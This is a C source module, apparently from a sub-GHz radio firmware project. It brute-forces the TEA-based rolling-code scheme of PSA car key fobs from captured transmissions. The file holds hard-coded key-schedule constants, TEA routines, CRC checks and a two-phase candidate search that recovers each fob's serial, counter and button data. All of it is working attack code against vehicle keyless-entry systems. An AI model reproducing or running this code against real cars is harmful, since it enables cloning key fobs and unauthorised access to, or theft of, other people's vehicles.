/* See COPYING.txt for license details. */

/**
 * @file   subghz_psa_bruteforce.c
 * @brief  PSA two-phase TEA brute-force key recovery — pure-logic module.
 *
 * Algorithm ported from the ProtoPirate reference
 * (RocketGod-git/ProtoPirate, protocols/psa_crypto.c + psa_crypto_bf.c).
 * See subghz_psa_bruteforce.h for the search overview.
 *
 * This file has no hardware dependencies and is testable on the host.
 *
 * M1 Project — Hapax fork
 */

#include "subghz_psa_bruteforce.h"

#include <stddef.h>

/*============================================================================*/
/* Constants (from the ProtoPirate reference)                                  */
/*============================================================================*/

const uint32_t subghz_psa_bf1_key_schedule[4] = {
    0x4A434915u, 0xD6743C2Bu, 0x1F29D308u, 0xE6B79A64u,
};

const uint32_t subghz_psa_bf2_key_schedule[4] = {
    0x4039C240u, 0xEDA92CABu, 0x4306C02Au, 0x02192A04u,
};

/* Phase-1 working-key derivation constants. */
#define PSA_BF1_CONST_U4  0x0E0F5C41u
#define PSA_BF1_CONST_U5  0x0F5C4123u
#define PSA_BF1_LOW_BYTE  0x0Eu

/*============================================================================*/
/* TEA primitives                                                              */
/*============================================================================*/

void subghz_psa_tea_build_schedule(const uint32_t key[4],
                                   subghz_psa_tea_schedule_t *out)
{
    for (uint32_t i = 0; i < PSA_BF_TEA_ROUNDS; i++)
    {
        const uint32_t sum0 = i * PSA_BF_TEA_DELTA;
        const uint32_t sum1 = (i + 1u) * PSA_BF_TEA_DELTA;
        out->s0[i] = key[sum0 & 3u] + sum0;
        out->s1[i] = key[(sum1 >> 11) & 3u] + sum1;
    }
}

void subghz_psa_tea_encrypt_scheduled(uint32_t *v0, uint32_t *v1,
                                      const subghz_psa_tea_schedule_t *sched)
{
    uint32_t a = *v0;
    uint32_t b = *v1;

    for (uint32_t i = 0; i < PSA_BF_TEA_ROUNDS; i++)
    {
        a += sched->s0[i] ^ (((b >> 5) ^ (b << 4)) + b);
        b += sched->s1[i] ^ (((a >> 5) ^ (a << 4)) + a);
    }

    *v0 = a;
    *v1 = b;
}

void subghz_psa_tea_encrypt(uint32_t *v0, uint32_t *v1,
                            const uint32_t key[4])
{
    subghz_psa_tea_schedule_t sched;
    subghz_psa_tea_build_schedule(key, &sched);
    subghz_psa_tea_encrypt_scheduled(v0, v1, &sched);
}

void subghz_psa_tea_decrypt(uint32_t *v0, uint32_t *v1,
                            const uint32_t key[4])
{
    uint32_t a = *v0;
    uint32_t b = *v1;
    uint32_t sum = PSA_BF_TEA_DELTA * PSA_BF_TEA_ROUNDS;

    for (uint32_t i = 0; i < PSA_BF_TEA_ROUNDS; i++)
    {
        uint32_t temp = key[(sum >> 11) & 3u] + sum;
        sum -= PSA_BF_TEA_DELTA;
        b -= temp ^ (((a >> 5) ^ (a << 4)) + a);
        temp = key[sum & 3u] + sum;
        a -= temp ^ (((b >> 5) ^ (b << 4)) + b);
    }

    *v0 = a;
    *v1 = b;
}

/*============================================================================*/
/* Capture packing                                                             */
/*============================================================================*/

void subghz_psa_bf_setup_byte_buffer(uint8_t buffer[10], uint32_t key1_low,
                                     uint32_t key1_high, uint16_t key2)
{
    for (uint32_t i = 0; i < 8u; i++)
    {
        const uint32_t shift = i * 8u;
        const uint8_t byte_val =
            (shift < 32u) ? (uint8_t)((key1_low >> shift) & 0xFFu)
                          : (uint8_t)((key1_high >> (shift - 32u)) & 0xFFu);
        buffer[7u - i] = byte_val;
    }
    buffer[9] = (uint8_t)(key2 & 0xFFu);
    buffer[8] = (uint8_t)((key2 >> 8) & 0xFFu);
}

void subghz_psa_bf_prepare_tea_data(const uint8_t buffer[10], uint32_t *w0,
                                    uint32_t *w1)
{
    *w0 = ((uint32_t)buffer[3] << 16) | ((uint32_t)buffer[2] << 24) |
          ((uint32_t)buffer[4] << 8) | (uint32_t)buffer[5];
    *w1 = ((uint32_t)buffer[7] << 16) | ((uint32_t)buffer[6] << 24) |
          ((uint32_t)buffer[8] << 8) | (uint32_t)buffer[9];
}

/*============================================================================*/
/* Integrity checks                                                            */
/*============================================================================*/

uint8_t subghz_psa_bf_tea_crc(uint32_t v0, uint32_t v1)
{
    uint32_t crc = ((v0 >> 24) & 0xFFu) + ((v0 >> 16) & 0xFFu) +
                   ((v0 >> 8) & 0xFFu) + (v0 & 0xFFu);
    crc += ((v1 >> 24) & 0xFFu) + ((v1 >> 16) & 0xFFu) + ((v1 >> 8) & 0xFFu);
    /* Note: the low byte of v1 is intentionally excluded — it carries the
     * CRC itself. */
    return (uint8_t)(crc & 0xFFu);
}

uint16_t subghz_psa_bf_crc16(const uint8_t *buffer, uint32_t length)
{
    uint16_t crc = 0;
    for (uint32_t i = 0; i < length; i++)
    {
        crc ^= (uint16_t)((uint16_t)buffer[i] << 8);
        for (uint32_t j = 0; j < 8u; j++)
        {
            crc = (crc & 0x8000u) ? (uint16_t)((crc << 1) ^ 0x8005u)
                                  : (uint16_t)(crc << 1);
        }
    }
    return crc;
}

/*============================================================================*/
/* Result extraction                                                           */
/*============================================================================*/

void subghz_psa_bf_extract_result(uint32_t v0, uint32_t v1, uint32_t candidate,
                                  subghz_psa_bf_result_t *out)
{
    /* Unpack the decrypted block back into wire-buffer byte positions:
     * buffer[2..5] = v0 big-endian, buffer[6..9] = v1 big-endian. */
    const uint8_t b2 = (uint8_t)(v0 >> 24);
    const uint8_t b3 = (uint8_t)((v0 >> 16) & 0xFFu);
    const uint8_t b4 = (uint8_t)((v0 >> 8) & 0xFFu);
    const uint8_t b5 = (uint8_t)(v0 & 0xFFu);
    const uint8_t b6 = (uint8_t)(v1 >> 24);
    const uint8_t b7 = (uint8_t)((v1 >> 16) & 0xFFu);
    const uint8_t b8 = (uint8_t)((v1 >> 8) & 0xFFu);
    const uint8_t b9 = (uint8_t)(v1 & 0xFFu);

    out->button = (uint8_t)((b5 >> 4) & 0x0Fu);
    out->serial = ((uint32_t)b3 << 8) | ((uint32_t)b2 << 16) | (uint32_t)b4;
    out->counter = ((uint32_t)b7 << 8) | ((uint32_t)b6 << 16) |
                   (uint32_t)b8 | (((uint32_t)b5 & 0x0Fu) << 24);
    out->crc = (uint16_t)b9;
    out->seed = out->serial;
    out->candidate = candidate;
    out->type = PSA_BF_RESULT_TYPE;
}

/*============================================================================*/
/* Candidate evaluation                                                        */
/*============================================================================*/

/**
 * @brief  Evaluate one phase-1 candidate.  Returns true and fills
 *         (@p dec_v0, @p dec_v1) with the verified plaintext on a hit.
 */
static bool psa_bf_phase1_try(uint32_t candidate, uint32_t w0, uint32_t w1,
                              const subghz_psa_tea_schedule_t *bf1_sched,
                              uint32_t *dec_v0, uint32_t *dec_v1)
{
    /* Derive the per-candidate 128-bit working key: two TEA encryptions of
     * fixed/candidate constants under the outer bf1 schedule. */
    uint32_t wk2 = PSA_BF1_CONST_U4;
    uint32_t wk3 = candidate;
    subghz_psa_tea_encrypt_scheduled(&wk2, &wk3, bf1_sched);

    uint32_t wk0 = (candidate << 8) | PSA_BF1_LOW_BYTE;
    uint32_t wk1 = PSA_BF1_CONST_U5;
    subghz_psa_tea_encrypt_scheduled(&wk0, &wk1, bf1_sched);

    const uint32_t working_key[4] = {wk0, wk1, wk2, wk3};

    uint32_t a = w0;
    uint32_t b = w1;
    subghz_psa_tea_decrypt(&a, &b, working_key);

    /* Echo check: the candidate's low 24 bits must appear in the plaintext. */
    if ((candidate & 0xFFFFFFu) != (a >> 8))
        return false;

    /* Integrity: 8-bit additive CRC must match the plaintext low byte. */
    if (subghz_psa_bf_tea_crc(a, b) != (uint8_t)(b & 0xFFu))
        return false;

    *dec_v0 = a;
    *dec_v1 = b;
    return true;
}

/**
 * @brief  Evaluate one phase-2 candidate.  Returns true and fills
 *         (@p dec_v0, @p dec_v1) with the verified plaintext on a hit.
 */
static bool psa_bf_phase2_try(uint32_t candidate, uint32_t w0, uint32_t w1,
                              uint32_t *dec_v0, uint32_t *dec_v1)
{
    const uint32_t working_key[4] = {
        subghz_psa_bf2_key_schedule[0] ^ candidate,
        subghz_psa_bf2_key_schedule[1] ^ candidate,
        subghz_psa_bf2_key_schedule[2] ^ candidate,
        subghz_psa_bf2_key_schedule[3] ^ candidate,
    };

    uint32_t a = w0;
    uint32_t b = w1;
    subghz_psa_tea_decrypt(&a, &b, working_key);

    if ((candidate & 0xFFFFFFu) != (a >> 8))
        return false;

    /* Integrity: CRC-16 over a fixed 6-byte window of the plaintext must
     * match the low 16 bits of v1. */
    const uint8_t crc_buffer[6] = {
        (uint8_t)((a >> 24) & 0xFFu),
        (uint8_t)((a >> 8) & 0xFFu),
        (uint8_t)((a >> 16) & 0xFFu),
        (uint8_t)(a & 0xFFu),
        (uint8_t)((b >> 24) & 0xFFu),
        (uint8_t)((b >> 16) & 0xFFu),
    };
    if (subghz_psa_bf_crc16(crc_buffer, sizeof(crc_buffer)) !=
        (uint16_t)(b & 0xFFFFu))
        return false;

    *dec_v0 = a;
    *dec_v1 = b;
    return true;
}

/*============================================================================*/
/* Search                                                                      */
/*============================================================================*/

bool subghz_psa_bf_run_range(subghz_bruteforce_job_t *job, uint64_t key1,
                             uint16_t key2, subghz_psa_bf_phase_t phase,
                             uint32_t start, uint32_t end,
                             subghz_psa_bf_result_t *out)
{
    if (job == NULL || end < start)
        return false;
    if (phase != PSA_BF_PHASE_1 && phase != PSA_BF_PHASE_2)
        return false;
    const uint32_t phase_start =
        (phase == PSA_BF_PHASE_1) ? PSA_BF1_START : PSA_BF2_START;
    const uint32_t phase_end =
        (phase == PSA_BF_PHASE_1) ? PSA_BF1_END : PSA_BF2_END;
    if (start < phase_start || end > phase_end)
        return false;

    uint8_t buffer[10];
    subghz_psa_bf_setup_byte_buffer(buffer, (uint32_t)(key1 & 0xFFFFFFFFu),
                                    (uint32_t)((key1 >> 32) & 0xFFFFFFFFu),
                                    key2);

    uint32_t w0, w1;
    subghz_psa_bf_prepare_tea_data(buffer, &w0, &w1);

    /* The phase-1 outer schedule is fixed; build it once per range run. */
    subghz_psa_tea_schedule_t bf1_sched;
    if (phase == PSA_BF_PHASE_1)
        subghz_psa_tea_build_schedule(subghz_psa_bf1_key_schedule, &bf1_sched);

    for (uint32_t candidate = start; candidate < end; candidate++)
    {
        uint32_t dec_v0 = 0, dec_v1 = 0;
        const bool matched =
            (phase == PSA_BF_PHASE_1)
                ? psa_bf_phase1_try(candidate, w0, w1, &bf1_sched,
                                    &dec_v0, &dec_v1)
                : psa_bf_phase2_try(candidate, w0, w1, &dec_v0, &dec_v1);

        if (!subghz_bruteforce_job_advance(job, matched, candidate))
            return false;  /* range overran the armed job total */
        if (job->status != SUBGHZ_BRUTEFORCE_JOB_RUNNING)
        {
            if (job->status == SUBGHZ_BRUTEFORCE_JOB_FOUND)
            {
                if (out != NULL)
                    subghz_psa_bf_extract_result(dec_v0, dec_v1, candidate,
                                                 out);
                return true;
            }
            return false;  /* cancelled or exhausted */
        }
    }

    return false;
}

bool subghz_psa_bf_run(subghz_bruteforce_job_t *job, uint64_t key1,
                       uint16_t key2, subghz_psa_bf_result_t *out)
{
    if (job == NULL)
        return false;

    if (!subghz_bruteforce_job_begin(job, PSA_BF_TOTAL))
        return false;

    if (subghz_psa_bf_run_range(job, key1, key2, PSA_BF_PHASE_1,
                                PSA_BF1_START, PSA_BF1_END, out))
        return true;
    if (job->status != SUBGHZ_BRUTEFORCE_JOB_RUNNING)
        return false;  /* cancelled during phase 1 */

    return subghz_psa_bf_run_range(job, key1, key2, PSA_BF_PHASE_2,
                                   PSA_BF2_START, PSA_BF2_END, out);
}
